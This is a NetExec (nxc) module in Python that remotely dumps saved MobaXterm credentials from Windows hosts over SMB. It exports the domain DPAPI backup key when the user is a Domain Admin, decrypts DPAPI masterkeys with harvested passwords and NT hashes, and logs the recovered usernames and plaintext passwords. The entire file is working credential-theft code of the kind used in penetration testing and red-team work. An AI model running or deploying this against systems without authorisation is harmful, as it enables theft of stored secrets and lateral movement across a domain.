from dploot.triage.masterkeys import MasterkeysTriage, parse_masterkey_file
from dploot.triage.backupkey import BackupkeyTriage
from dploot.triage.mobaxterm import MobaXtermTriage, MobaXtermCredential, MobaXtermPassword
from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection

from nxc.helpers.logger import highlight


class NXCModule:
    name = "mobaxterm"
    description = "Remotely dump MobaXterm credentials via RemoteRegistry or NTUSER.dat export"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        """
        PVK             Domain backup key file
        MKFILE          File with masterkeys in form of {GUID}:SHA1
        """
        self.pvkbytes = None
        self.masterkeys = None
        self.conn = None
        self.target = None

        if "PVK" in module_options:
            self.pvkbytes = open(module_options["PVK"], "rb").read()  # noqa: SIM115

        if "MKFILE" in module_options:
            self.masterkeys = parse_masterkey_file(module_options["MKFILE"])
            self.pvkbytes = open(module_options["MKFILE"], "rb").read()  # noqa: SIM115

    def on_admin_login(self, context, connection):
        host = connection.hostname + "." + connection.domain
        domain = connection.domain
        username = connection.username
        kerberos = connection.kerberos
        aesKey = connection.aesKey
        use_kcache = getattr(connection, "use_kcache", False)
        password = getattr(connection, "password", "")
        lmhash = getattr(connection, "lmhash", "")
        nthash = getattr(connection, "nthash", "")

        if self.pvkbytes is None:
            try:
                dc = Target.create(
                    domain=domain,
                    username=username,
                    password=password,
                    target=domain,
                    lmhash=lmhash,
                    nthash=nthash,
                    do_kerberos=kerberos,
                    aesKey=aesKey,
                    no_pass=True,
                    use_kcache=use_kcache,
                )

                dc_conn = DPLootSMBConnection(dc)
                dc_conn.connect()

                if dc_conn.is_admin:
                    context.log.success("User is Domain Administrator, exporting domain backupkey...")
                    backupkey_triage = BackupkeyTriage(target=dc, conn=dc_conn)
                    backupkey = backupkey_triage.triage_backupkey()
                    self.pvkbytes = backupkey.backupkey_v2
            except Exception as e:
                context.log.debug(f"Could not get domain backupkey: {e}")

        self.target = Target.create(
            domain=domain,
            username=username,
            password=password,
            target=host,
            lmhash=lmhash,
            nthash=nthash,
            do_kerberos=kerberos,
            aesKey=aesKey,
            no_pass=True,
            use_kcache=use_kcache,
        )

        try:
            self.conn = DPLootSMBConnection(self.target)
            self.conn.smb_session = connection.conn
        except Exception as e:
            context.log.debug(f"Could not upgrade connection: {e}")
            return

        plaintexts = {username: password for _, _, username, password, _, _ in context.db.get_credentials(cred_type="plaintext")}
        nthashes = {username: nt.split(":")[1] if ":" in nt else nt for _, _, username, nt, _, _ in context.db.get_credentials(cred_type="hash")}
        if password != "":
            plaintexts[username] = password
        if nthash != "":
            nthashes[username] = nthash

        if self.masterkeys is None:
            try:
                masterkeys_triage = MasterkeysTriage(
                    target=self.target,
                    conn=self.conn,
                    pvkbytes=self.pvkbytes,
                    passwords=plaintexts,
                    nthashes=nthashes,
                    dpapiSystem={},
                )
                self.masterkeys = masterkeys_triage.triage_masterkeys()
            except Exception as e:
                context.log.debug(f"Could not get masterkeys: {e}")

        if len(self.masterkeys) == 0:
            context.log.fail("No masterkeys looted")
            return

        context.log.success(f"Got {highlight(len(self.masterkeys))} decrypted masterkeys. Looting MobaXterm secrets")

        try:
            triage = MobaXtermTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys)
            _, credentials = triage.triage_mobaxterm()
            for credential in credentials:
                if isinstance(credential, MobaXtermCredential):
                    log_text = "{} - {}:{}".format(credential.name, credential.username, credential.password.decode("latin-1"))
                elif isinstance(credential, MobaXtermPassword):
                    log_text = "{}:{}".format(credential.username, credential.password.decode("latin-1"))
                context.log.highlight(f"[{credential.winuser}] {log_text}")
        except Exception as e:
            context.log.debug(f"Could not loot MobaXterm secrets: {e}")
